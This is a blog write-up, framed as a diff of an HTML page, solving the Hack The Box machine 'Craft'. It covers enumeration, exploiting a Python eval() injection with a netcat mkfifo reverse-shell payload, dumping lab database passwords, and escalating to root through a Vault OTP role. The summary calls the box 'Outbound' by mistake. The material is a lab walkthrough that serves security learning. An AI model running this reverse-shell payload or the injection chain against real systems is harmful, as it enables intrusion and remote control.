@@ -1,0 +1,596 @@
+<!doctype html>
+<html
+  lang="en-us" 
+  data-theme-mode="auto"
+  >
+  <head><meta charset="utf-8" />
+<meta
+  name="viewport"
+  content="width=device-width, initial-scale=1, shrink-to-fit=no"
+/><title>
+  HTB - Craft | ToonExodia
+</title>
+<meta
+  name="description"
+  content="ligolo"
+/><script>
+  window.siteConfig = JSON.parse("{\"anchor_icon\":null,\"base\":\"https://ropchainski.com/\",\"clipboard\":{\"copyright\":{\"count\":50,\"enable\":false,\"license_type\":\"by-nc-sa\"},\"fail\":{\"en\":\"Copy failed (ﾟ⊿ﾟ)ﾂ\",\"ja\":\"コピー失敗 (ﾟ⊿ﾟ)ﾂ\",\"pt-br\":\"Falha ao copiar (ﾟ⊿ﾟ)ﾂ\",\"zh-cn\":\"复制失败 (ﾟ⊿ﾟ)ﾂ\",\"zh-tw\":\"複製失敗 (ﾟ⊿ﾟ)ﾂ\"},\"success\":{\"en\":\"Copy successfully (*^▽^*)\",\"ja\":\"コピー成功 (*^▽^*)\",\"pt-br\":\"Copiado com sucesso (*^▽^*)\",\"zh-cn\":\"复制成功 (*^▽^*)\",\"zh-tw\":\"複製成功 (*^▽^*)\"}},\"code_block\":{\"expand\":true},\"icon_font\":\"4552607_4k4bc36ef96\",\"outdate\":{\"daysago\":180,\"enable\":false,\"message\":{\"en\":\"This article was last updated on {time}. Please note that the content may no longer be applicable.\",\"ja\":\"この記事は最終更新日：{time}。記載内容が現在有効でない可能性がありますのでご注意ください。\",\"pt-br\":\"Este artigo foi atualizado pela última vez em {time}. Observe que o conteúdo pode não ser mais aplicável.\",\"zh-cn\":\"本文最后更新于 {time}，请注意文中内容可能已不适用。\",\"zh-tw\":\"本文最後更新於 {time}，請注意文中內容可能已不適用。\"}}}");
+  
+</script>
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link
+  rel="preload"
+  as="style"
+  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
+/>
+<link
+  rel="stylesheet"
+  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
+  media="print"
+  onload="this.media='all'"
+/>
+<link
+    rel="preload"
+    href="//at.alicdn.com/t/c/font_4552607_4k4bc36ef96.woff2"
+    as="font"
+    type="font/woff2"
+    crossorigin="anonymous"
+  /><meta property="og:type" content="website" />
+  <meta property="og:title" content="HTB - Craft | ToonExodia" />
+  <meta
+    property="og:description"
+    content="ligolo"
+  />
+  <meta property="og:url" content="https://ropchainski.com/post/htb/medium/craft/" />
+  <meta
+    property="og:site_name"
+    content="Home"
+  />
+  <meta
+    property="og:image"
+    content="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/a35341c8bdfb0a18b6015f8ff3fce8dd.png"
+  />
+  <meta property="article:author" content="ToonExodia" />
+  <meta property="article:published_time" content="2025-07-29T00:00:00&#43;00:00" />
+  <meta property="article:modified_time" content="2025-07-29T00:00:00&#43;00:00" /><meta name="twitter:card" content="summary" />
+  <meta name="twitter:image" content="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/a35341c8bdfb0a18b6015f8ff3fce8dd.png" />
+<link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/main.min.1dfe716844d4b47e6c79c541d5b13be968b5271bffe6d4f8485caa89ccfdd0ac.css" />
+<link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css"
+    integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei&#43;Zx/1oA/0l8ysE" crossorigin="anonymous"onload="this.onload=null;this.rel='stylesheet'"
+  /><link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/katex@0.16.22/dist/katex.min.css"
+    integrity="sha384-5TcZemv2l/9On385z///&#43;d7MSYlvIEw9FuZTIdZ14vJLqWphw7e7ZPuOiCHJcFCP" crossorigin="anonymous"onload="this.onload=null;this.rel='stylesheet'"
+  /><script
+    src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"
+    integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script><link
+    rel="stylesheet"
+    href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css"
+    integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous"/></head>
+  <body><div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+<div id="lang-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+This article does not have a corresponding language version
+</div>
+<div id="heatmap-tooltip"></div><div id="container">
+      <div id="wrap"><div id="header-nav">
+  <nav id="main-nav"><span class="main-nav-link-wrap">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <a class="main-nav-link" href="/">Home</a>
+      </span><span class="main-nav-link-wrap">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <a class="main-nav-link" href="/archives">Archives</a>
+      </span><span class="main-nav-link-wrap">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <a class="main-nav-link" href="/about">About</a>
+      </span><span class="main-nav-link-wrap">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <a class="main-nav-link" href="/friend">Friend</a>
+      </span><a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav"></nav></div>
+<header id="header"><picture></picture>
+    <img  fetchpriority="high" src="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/a35341c8bdfb0a18b6015f8ff3fce8dd.png" alt="HTB - Craft"><div id="header-outer">
+    <div id="header-title"><span id="logo">
+            <h1 data-aos="slide-up">HTB - Craft</h1>
+          </span><h2 id="subtitle-wrap" data-aos="slide-down"></h2></div>
+  </div>
+</header><div id="content"
+          class="sidebar-left"
+            ><aside id="sidebar"><div class="sidebar-wrapper-container sticky"><div class="sidebar-wrapper">
+    <div
+      class="sidebar-wrap"
+      data-aos="fade-up"
+    ><div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
+<div class="sidebar-toc-wrapper toc-div-class">
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#enumeration">Enumeration</a>
+      <ul>
+        <li><a href="#initial-scan">Initial Scan</a></li>
+        <li><a href="#website-analysis">Website Analysis</a></li>
+        <li><a href="#gogscrafthtb">gogs.craft.htb</a></li>
+        <li><a href="#apicrafthtb">api.craft.htb</a></li>
+      </ul>
+    </li>
+    <li><a href="#initial-foothold">Initial Foothold</a>
+      <ul>
+        <li><a href="#exploitation-process">Exploitation Process</a></li>
+      </ul>
+    </li>
+    <li><a href="#container-enumeration">Container Enumeration</a>
+      <ul>
+        <li><a href="#web-app-analysis-part-2">Web App Analysis Part 2</a></li>
+      </ul>
+    </li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+    <li><a href="#summary">Summary</a></li>
+  </ul>
+</nav>
+</div></div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img
+    data-src="/avatar/avatar.webp"
+    data-sizes="auto"
+    alt="ToonExodia"
+    class="lazyload"
+  />
+  <div class="sidebar-author-name">ToonExodia</div>
+  <div class="sidebar-description">ligolo</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Posts</div><div class="sidebar-state-number">1</div>
+  </div>
+  <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
+    <div>Categories</div>
+    <div class="sidebar-state-number">
+      2
+    </div>
+  </a>
+  <a class="sidebar-state-tag" href="/tags/" aria-label="sidebar-state-tag-link">
+    <div>Tags</div>
+    <div class="sidebar-state-number">0</div>
+  </a>
+</div>
+<div class="sidebar-social"><div class="icon-github sidebar-social-icon">
+      <a
+        href="https://github.com/ToonExodia"
+        itemprop="url"
+        target="_blank"
+        aria-label="github"
+        rel="noopener external nofollow noreferrer"
+      ></a>
+    </div></div>
+<div class="sidebar-menu"><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/"
+        aria-label="Home"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">Home</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/archives"
+        aria-label="Archives"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">Archives</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/about"
+        aria-label="About"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">About</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/friend"
+        aria-label="Friend"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">Friend</div>
+    </div></div>
+</div><div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div></div>
+  </div><div class="sidebar-widget"></div></div></aside>
+<section id="main"><article
+  class="h-entry article"
+  itemprop="blogPost"
+  itemscope
+  itemtype="https://schema.org/BlogPosting"
+>
+  <div
+    class="article-inner"
+    data-aos="fade-up"
+  >
+    <div class="article-meta"><div class="article-date">
+  <span
+    class="article-date-link icon-calendar"
+    data-aos="zoom-in"
+  >
+    <time datetime="2025-07-29 00:00:00 &#43;0000 UTC" itemprop="datePublished"
+      >2025-07-29</time
+    >
+    <time style="display: none;" id="post-update-time"
+      >2025-07-29</time
+    >
+  </span></div>
+<div class="article-category"><a
+      class="article-category-link"
+      href="/categories/htb-medium"
+      data-aos="zoom-in"
+      >HTB - MEDIUM</a
+    ><a
+      class="article-category-link"
+      href="/categories/linux"
+      data-aos="zoom-in"
+      >LINUX</a
+    ></div>
+</div><div class="hr-line"></div><div class="e-content article-entry" itemprop="articleBody"><p>Craft is a medium-difficulty Linux box that begins with exploring a public Git service called gogs. This box demonstrates a full attack chain involving an <code>eval()</code> injection vulnerability in a Python API, SQL credential extraction, database enumeration, and lateral movement via exposed SSH keys. Privilege escalation is achieved using a misconfigured Vault setup that allows one-time SSH login as root.</p>
+<h2 id="enumeration">
+<a class="header-anchor" href="#enumeration"></a>
+Enumeration
+</h2><h3 id="initial-scan">
+<a class="header-anchor" href="#initial-scan"></a>
+Initial Scan
+</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -sCV -v -p- 10.10.10.110
+</span></span></code></pre></div><p><img src="imgs/nmap.png" alt="nmap.png"></p>
+<p>The scan shows:</p>
+<ul>
+<li><strong>SSH (22/tcp)</strong>: OpenSSH</li>
+<li><strong>HTTP (443/tcp)</strong>: With hostname/commonName being <code>craft.htb</code></li>
+<li><strong>SSH (6022/tcp)</strong>: Go-based SSH server</li>
+</ul>
+
+  <blockquote class="alert-blockquote note">
+    <p class="alert-heading">
+      Note
+    </p>
+    <p><p>make sure to add the hostname to <code>/etc/hosts</code></p></p>
+  </blockquote>
+
+<h3 id="website-analysis">
+<a class="header-anchor" href="#website-analysis"></a>
+Website Analysis
+</h3><p>Visiting <code>http://craft.htb</code> presents us with a certificate warning, before accepting I check to see if there is any potentially important information by viewing the certificate before accepting. Although there is nothing too interesting about this certificate, we do see that the certificate email shows <code>admin@craft.htb</code> which could be a potential username.</p>
+<p><img src="imgs/ssl-potentialrisk.png" alt="ssl-potentialrisk.png"></p>
+<p><img src="imgs/ssl-potential-admin.png" alt="ssl-potential-admin.png"></p>
+<p>After accepting the SSL certificate, we are brought to an about page.</p>
+<p><img src="imgs/craft-landing-page.png" alt="craft-landing-page.png"></p>
+<p>There really isn&rsquo;t any valuable information on this page, but there are 2 other links at the top right of the page that lead to the following:</p>
+<ul>
+<li><code>gogs.craft.htb</code></li>
+<li><code>api.craft.htb</code></li>
+</ul>
+<p>remember to add these to <code>/etc/hosts</code></p>
+<h3 id="gogscrafthtb">
+<a class="header-anchor" href="#gogscrafthtb"></a>
+gogs.craft.htb
+</h3><p>Accessing this site, we are met with an information page for gogs, a self-hosted git service. At the bottom of the page, we can see the application version is 0.11. After doing some research, we can identify three related CVEs - CVE-2014-8681, CVE-2014-8682, and CVE-2024-39930. However, this path turns out to be a dead end. This is because two of the CVEs are outdated (from 2014), and although the most recent one does affect version 0.11, it was discovered in 2024 and wouldn&rsquo;t have been present when this machine was released.</p>
+<p>Navigating to the Explore tab, we can see the current craft-api repo, along with a list of users and organizations. Looking more into the craft-api repo we can see a number of commits that were made along with a current open issue.</p>
+<p><img src="imgs/craftapi-repo-page.png" alt="craftapi-repo-page.png"></p>
+<p>Looking more into the open issue, we see a few interesting pieces of information. The first being an JWT token:</p>
+<p><img src="imgs/craftapi-repoissue.png" alt="craftapi-repoissue.png"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTU0OTM4NTI0Mn0.-wW1aJkLQDOE-GP5pQd3z_BJTe2Uo0jJ_mQ238P5Dqw
+</span></span></code></pre></div><p>Plugging this token into jwt.io we can see a little more information about this token, particularly that this token is expired.</p>
+<p><img src="imgs/jwt-decoded.png" alt="jwt-decoded.png"></p>
+<p>Moving down the list we see talks about a &ldquo;sorry excuse for a patch&rdquo;, which is noted as commit <code>c414b16057</code>. Looking into this patch we see the following code</p>
+<p><img src="imgs/craftapi-eval-bad.png" alt="craftapi-eval-bad.png"></p>
+<p>The main issue with this patch is the use of an <code>eval()</code> statement with unsanitized user input, which is insecure and considered bad practice. In this particular case, the server evaluates the <code>abv</code> value from the clients request directly using <code>eval('%s &gt; 1' % request.json['abv'])</code>. Since <code>eval()</code> executes arbitrary python code, this could allow us to execute a reverse shell and grant us access onto the system.</p>
+<p>Looking through some of the other previous commits that were made, commit <code>a2d28ed155</code> is another notable change because of the removal of credentials <code>dinesh:4aUh0A8PbVJxgd</code> from test.py. Although we cannot SSH into the machine with these creds, we can log in to the gogs website with these creds. These creds will also be used later on in the foothold section.</p>
+<p><img src="imgs/dinesh-creds.png" alt="dinesh-creds.png"></p>
+<h3 id="apicrafthtb">
+<a class="header-anchor" href="#apicrafthtb"></a>
+api.craft.htb
+</h3><p>Visiting this site we are met with the documentation site for the Craft API. There isn&rsquo;t much here, but this site does give us the ability to test login tokens via the <code>/auth/login</code> dropdown, although this site is not used throughout the rest of this writeup.</p>
+<h2 id="initial-foothold">
+<a class="header-anchor" href="#initial-foothold"></a>
+Initial Foothold
+</h2><p>After downloading the craft-api repo, we can navigate to <code>craft-api/craft_api/api/brew/endpoints/brew.py</code> to check and see if the <code>eval()</code> statement is still there. After confirming that it&rsquo;s still there, we can proceed to navigate into the <code>craft-api/tests</code> folder and look into <code>test.py</code> script that dinesh was using. looking further down the script we can also see that this is where the <code>abv</code> value is held (This will be replaced later on with our reverse shell to gain access to the system).</p>
+<p><img src="imgs/testpy-withoutcreds.png" alt="testpy-withoutcreds.png"></p>
+<p>When we try running this script normally, we get an invalid token response
+<img src="imgs/testpy-nowork.png" alt="testpy-nowork.png"></p>
+<p>But when we input the missing creds that we got from the commit, we can see that test.py is working and returns us a valid token response
+<img src="imgs/testpy-withcreds.png" alt="testpy-withcreds.png">
+<img src="imgs/testpy-work.png" alt="testpy-work.png"></p>
+<p>Another script that&rsquo;s important in this repo is <code>dbtest.py</code>. Looking into this script we can see that this is what allows us to execute SQL commands, but for now it doesn&rsquo;t work. This is because this script requires <code>settings.py</code>, which is currently in the <code>.gitignore</code> section of the repo.
+<img src="imgs/show-dbtestpy.png" alt="show-dbtestpy.png"></p>
+<h3 id="exploitation-process">
+<a class="header-anchor" href="#exploitation-process"></a>
+Exploitation Process
+</h3><p>Confirming that the credentials work with the <code>test.py</code> script, we can proceed to abuse the <code>eval()</code> vulnerability by replace the <code>abv</code> value with our own payload. In order to do this we need to wrap our payload in a string so that it may run as a single expression, like this: <code>&quot;__import__('os').system('REVSHELL METHOD HERE')&quot;</code>. This is due to the way the <code>eval()</code> statement work, as it does not like multi-line expressions.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="s2">&#34;__import__(&#39;os&#39;).system(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.2 6969 &gt;/tmp/f&#39;)&#34;</span>
+</span></span></code></pre></div><p><img src="imgs/python-eval-abuse.png" alt="python-eval-abuse.png"></p>
+<p>After setting up a listener and running <code>test.py</code> with the payload, we are granted a reverse shell onto the system.</p>
+<p><img src="imgs/container-shell.png" alt="container-shell.png"></p>
+<p>Althoug after some quick enumeration, we can see that we are within a docker container instead of a host system. Even though there may be valuable information within this docker container, I decide to look for low hanging fruit before trying to find specific docker exploits.</p>
+<p><img src="imgs/show-dockerenv-proof.png" alt="show-dockerenv-proof.png"></p>
+<h2 id="container-enumeration">
+<a class="header-anchor" href="#container-enumeration"></a>
+Container Enumeration
+</h2><p>Within the container, we can find the <code>settings.py</code> file under <code>/opt/app/craft_api</code>. Looking into this file we can see the database user, password, and name.</p>
+<p><img src="imgs/container-settingspy-db-usr-passwd.png" alt="container-settingspy-db-usr-passwd.png"></p>
+<p>Knowing that this container contains the <code>settings.py</code> that was needed for <code>dbtest.py</code>. I proceed to run the script that is on the container with success.</p>
+<p><img src="imgs/dbtestpy-run.png" alt="dbtestpy-run.png"></p>
+<p>After trying to vim/nano <code>dbtest.py</code> on the container, it was clear that we would need to modify the script locally on our host machine and then transfer it to the container. After modifying <code>dbtest.py</code> on my local machine, transferring it, and then running it. We get the following user information.</p>
+<ul>
+<li>dinesh:4aUh0A8PbVJxgd</li>
+<li>ebachman:llJ77D8QFkLPQB</li>
+<li>gilfoyle:ZEU3N8WNM2rh4T</li>
+</ul>
+<p><img src="imgs/showtablespy.png" alt="showtablespy.png">
+<img src="imgs/corrected-showtables.png" alt="corrected-showtables.png">
+<img src="imgs/running-showuserpy.png" alt="running-showuserpy.png"></p>
+<h3 id="web-app-analysis-part-2">
+<a class="header-anchor" href="#web-app-analysis-part-2"></a>
+Web App Analysis Part 2
+</h3><p>Trying use the credentials to SSH on both services fails. But when we try to log in to the gogs website, only the credentials for gilfoyle work.</p>
+<p>After further enumerating this account, we can see that gilfoyle has a private repo called <code>craft-infra</code>.</p>
+<p><img src="imgs/gilfoyle-privrepo-extended.png" alt="gilfoyle-privrepo-extended.png"></p>
+<p>Looking into this repo, we can see that there is a <code>.ssh</code> folder with both a private and public key inside.</p>
+<p><img src="imgs/gilfoyle-sshkeys.png" alt="gilfoyle-sshkeys.png"></p>
+<p>Downloading the repo, we give the file read write privileges, and proceed to log into the machine as gilfoyle. Using the password that we found from the database.</p>
+<p><img src="imgs/gainuser.png" alt="gainuser.png"></p>
+<h2 id="privilege-escalation">
+<a class="header-anchor" href="#privilege-escalation"></a>
+Privilege Escalation
+</h2><p>As always, the first thing we want to do when we compromise a machine is to run the following commands:</p>
+<ul>
+<li><code>whoami</code> -&gt; what user am I running as?</li>
+<li><code>groups</code> -&gt; what groups do I have access to? How could I take advantage of my current group?</li>
+<li><code>uname -a</code> -&gt; what is the current version of this OS? Is there a privesc vuln?</li>
+<li><code>ss -tulpn</code> -&gt; what services are currently running on this machine? Can it be abused or used?</li>
+<li><code>sudo -l</code> -&gt; what privileges do I have? How can I abuse them?</li>
+</ul>
+<p><img src="imgs/privesc-enumeration.png" alt="privesc-enumeration.png"></p>
+<p>After running through those basic commands, we don&rsquo;t really see anyhting interesting. But, doing <code>ls -lah</code> shows us some more files that we can look through. With the most interesting file being <code>.vault-token</code>. Doing some quick google <a href="https://developer.hashicorp.com/vault/docs/concepts/tokens">searching</a>, we can see that <code>.vault-token</code> is related to an application called vault, which is used to manage and protect secrets along with other sensitive data. If we look back at gilfoyles private repo, we can also find folder called vault which contains a <code>secrets.sh</code> file</p>
+<p><img src="imgs/root-vaulttoken.png" alt="root-vaulttoken.png"></p>
+<p><img src="imgs/root-vault-misconfig.png" alt="root-vault-misconfig.png"></p>
+<p>The <code>secrets.sh</code> file is very important because it tells us how vault is configured when it comes to managing SSH access using a One-Time Password (OTP). <code>secrets.sh</code> defines a role named <code>root_otp</code>, and sets <code>default_user=root</code>, along with <code>key_type=otp</code>. This tells us that Vault has been configured to generate temporary root login credentials, which can be used to SSH into the machine as root. This is well documented in the &ldquo;Automate it!&rdquo; section of the <a href="https://developer.hashicorp.com/vault/docs/secrets/ssh/one-time-ssh-passwords">documentation</a>. After using the one-liner and entering in the OTP session password that was given, we gain root access on the system.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">vault ssh -role root_otp -mode otp root@10.10.10.110
+</span></span></code></pre></div><p><img src="imgs/root-pwned.png" alt="root-pwned.png"></p>
+<h2 id="summary">
+<a class="header-anchor" href="#summary"></a>
+Summary
+</h2><p>The Outbound box demonstrates a realistic attack chain combining multiple vulnerabilities:</p>
+<ol>
+<li><strong>Initial Access</strong>: Abuse an <code>eval()</code> injection vulnerability in a gogs-hosted python API to gain container access</li>
+<li><strong>Credential Discovery</strong>: Modified a local copy of <code>dbtest.py</code> to extract user credentials within the container SQL</li>
+<li><strong>Lateral Movement</strong>: Used gilfoyle&rsquo;s credentials to access his gogs account and retrieve a private SSH key from a private repo</li>
+<li><strong>Host Access</strong>: Accessed the main host using gilfoyle&rsquo;s private SSH key and credentials from the gogs container</li>
+<li><strong>Privilege Escalation</strong>: Leveraged a Vault and misconfigured <code>secrets.sh</code> to generate a OTP SSH password and login as root</li>
+</ol>
+<p><img src="imgs/proof-pwned.png" alt="proof-pwned.png"></p>
+</div>
+    <footer class="article-footer"><ul class="article-tag-list" itemprop="keywords"></ul>
+</footer>
+  </div></article></section>
+        </div><footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info"><div>
+      <span class="icon-copyright"></span>2025-2026<span class="footer-info-sep rotate"></span>
+      ToonExodia
+    </div><div>
+        Powered by&nbsp;<a
+          href="https://gohugo.io/"
+          target="_blank"
+          >Hugo</a
+        >&nbsp; Theme.<a
+          href="https://github.com/D-Sketon/hugo-theme-reimu"
+          target="_blank"
+          >Reimu</a
+        >
+      </div><div>
+        <span class="icon-brush"
+          >&nbsp;1.5k</span
+        >
+        &nbsp;|&nbsp;
+        <span class="icon-coffee">&nbsp;00:07</span>
+      </div><div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv"
+          >Number of visits&nbsp;<span
+            id="busuanzi_value_site_pv"
+          ></span
+        ></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv"
+          >Number of visitors&nbsp;<span
+            id="busuanzi_value_site_uv"
+          ></span
+        ></span>
+      </div></div>
+</footer>
+<div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div><div id="mask" class="hide"></div>
+      </div><nav id="mobile-nav">
+  <div class="sidebar-wrap"><div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
+<div class="sidebar-toc-wrapper toc-div-class">
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#enumeration">Enumeration</a>
+      <ul>
+        <li><a href="#initial-scan">Initial Scan</a></li>
+        <li><a href="#website-analysis">Website Analysis</a></li>
+        <li><a href="#gogscrafthtb">gogs.craft.htb</a></li>
+        <li><a href="#apicrafthtb">api.craft.htb</a></li>
+      </ul>
+    </li>
+    <li><a href="#initial-foothold">Initial Foothold</a>
+      <ul>
+        <li><a href="#exploitation-process">Exploitation Process</a></li>
+      </ul>
+    </li>
+    <li><a href="#container-enumeration">Container Enumeration</a>
+      <ul>
+        <li><a href="#web-app-analysis-part-2">Web App Analysis Part 2</a></li>
+      </ul>
+    </li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+    <li><a href="#summary">Summary</a></li>
+  </ul>
+</nav>
+</div></div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img
+    data-src="/avatar/avatar.webp"
+    data-sizes="auto"
+    alt="ToonExodia"
+    class="lazyload"
+  />
+  <div class="sidebar-author-name">ToonExodia</div>
+  <div class="sidebar-description">ligolo</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Posts</div><div class="sidebar-state-number">1</div>
+  </div>
+  <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
+    <div>Categories</div>
+    <div class="sidebar-state-number">
+      2
+    </div>
+  </a>
+  <a class="sidebar-state-tag" href="/tags/" aria-label="sidebar-state-tag-link">
+    <div>Tags</div>
+    <div class="sidebar-state-number">0</div>
+  </a>
+</div>
+<div class="sidebar-social"><div class="icon-github sidebar-social-icon">
+      <a
+        href="https://github.com/ToonExodia"
+        itemprop="url"
+        target="_blank"
+        aria-label="github"
+        rel="noopener external nofollow noreferrer"
+      ></a>
+    </div></div>
+<div class="sidebar-menu"><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/"
+        aria-label="Home"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">Home</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/archives"
+        aria-label="Archives"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">Archives</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/about"
+        aria-label="About"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">About</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/friend"
+        aria-label="Friend"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">Friend</div>
+    </div></div>
+</div></div><div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div></nav>
+</div><script
+    src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"
+    integrity="sha384-3gT/vsepWkfz/ff7PpWNUeMzeWoH3cDhm/A8jM7ouoAK0/fP/9bcHHR5kHq2nf&#43;e" crossorigin="anonymous"></script><script
+    src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"
+    integrity="sha384-J08i8An/QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script><script src="/js/main.js" integrity="" crossorigin="anonymous" ></script><script src="/js/aos.js" integrity="" crossorigin="anonymous" ></script><script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === "loading") {
+      document.addEventListener("DOMContentLoaded", aosInit);
+    } else {
+      aosInit();
+    }
+  </script><script src="/js/pjax_main.js" integrity="" crossorigin="anonymous" data-pjax></script>
+
+<div id="lazy-script">
+  <div><script data-pjax>
+        window.REIMU_POST = {
+          author: "ToonExodia",
+          title: "HTB - Craft",
+          url: "https:\/\/ropchainski.com\/post\/htb\/medium\/craft\/",
+          description: "Craft is a medium-difficulty Linux box that begins with exploring a public Git service called gogs. This box demonstrates a full attack chain involving an eval() injection vulnerability in a Python API, SQL credential extraction, database enumeration, and lateral movement via exposed SSH keys. …",
+          cover: "https:\/\/htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com\/avatars\/a35341c8bdfb0a18b6015f8ff3fce8dd.png",
+        };
+      </script><script src="/js/insert_highlight.js" integrity="" crossorigin="anonymous" data-pjax></script><script type="module" data-pjax>const PhotoSwipeLightbox = (await safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js", "sha384-DiL6M\/gG\u002bwmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF\/N6lrZi\/")).default;const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',pswpModule: () => safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8\u002boTJ7m3DfYEWX1fu1scuS4\u002bs")}).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
